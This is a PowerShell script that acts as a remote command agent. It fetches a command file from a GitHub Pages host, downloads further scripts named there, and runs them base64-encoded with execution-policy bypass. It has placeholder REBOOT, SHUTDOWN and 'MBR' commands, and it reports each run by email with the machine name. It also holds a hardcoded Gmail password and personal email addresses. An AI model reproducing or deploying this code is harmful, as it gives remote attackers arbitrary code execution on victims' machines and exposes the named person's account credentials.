
$CurrentPath = (Get-Location).Path

Function Send-RunNotification
{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$subject,
        [string]$msgbody
    )
    $email = "radicaltronic@gmail.com"
    $recipients = "radicaltronic@gmail.com,guillaumeplante.qc@gmail.com"
    $pass = "SecretTEst23_"

    $EmailFrom = "radicaltronic@gmail.com"
    $EmailTo = "radicaltronic@gmail.com,guillaumeplante.qc@gmail.com"
    $Subject = $subject
    $Body = $msgbody
    $SMTPServer = "smtp.gmail.com"
    $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
    $SMTPClient.EnableSsl = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($email, $pass);
    $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
}

$FullLogs = ""

Function OutString
{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$String,
        [string]$FgColor = "w",
        [string]$BgColor ="b"
    )

    Write-Verbose $String
    $FullLogs = $FullLogs + $String + '`n`n'
}



function ConvertTo-EncodedScript
{
  param
  (
    $Path,
    
    [Switch]$Open
  )
  
  $Code = Get-Content -Path $Path -Raw
  $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Code) 
  $Base64 = [Convert]::ToBase64String($Bytes) 
  
  $NewPath = [System.IO.Path]::ChangeExtension($Path, '.b64')
  $Base64 | Set-Content -Path $NewPath

  if ($Open) { notepad $NewPath }
}


function ProcessCommand
{
  param
  (
    [string]$Command,
    [string]$Details
  )

   if($Command -like "DOWNLOAD_AND_RUN"){
     OutString "ProcessCommand: DOWNLOAD_AND_RUN"
        $file = $Details
        if($file -ne ""){

            $url='https://radicaltronic.github.io/cmd/' + $file
            $webclient = New-Object Net.WebClient
            OutString "ProcessCommand: DOWNLOAD_AND_RUN  -- $file $url"
            $data = $webclient.DownloadString($url)

            $bytes = [System.Text.Encoding]::Unicode.GetBytes($data)
            $encodedCommand = [Convert]::ToBase64String($bytes)
            powershell.exe -exec bypass -encodedCommand $encodedCommand

           
        }
    }elseif($Command -like "SENDSTATUS"){

        Send-Notification "status" "ok"
    }elseif($Command -like "REBOOT"){
        OutString "ProcessCommand: REBOOT"
     
    }elseif($Command -like "SHUTDOWN"){
        OutString "ProcessCommand: SHUTDOWN"
    }elseif($Command -like "MBR"){
        OutString "ProcessCommand: MBR"
    }
}


$CmdFile='https://radicaltronic.github.io/cmd/commands.run'
$webclient = New-Object Net.WebClient
$CmdData = $webclient.DownloadString($CmdFile)

OutString "Downloading $CmdFile"

OutString "Received $CmdData"
$CharArray =$CmdData.Split("`n")


foreach($cmd in $CharArray) {
    
    $index = $cmd.IndexOf('=')
    if($index -ne -1){
        $CmdDetails =$cmd.Split("=")
        ProcessCommand $CmdDetails[0] $CmdDetails[1]
    }else{
        ProcessCommand $cmd
    }
}

Send-RunNotification "STARTING Run of script on $env:COMPUTERNAME" "script logs: $FullLogs"


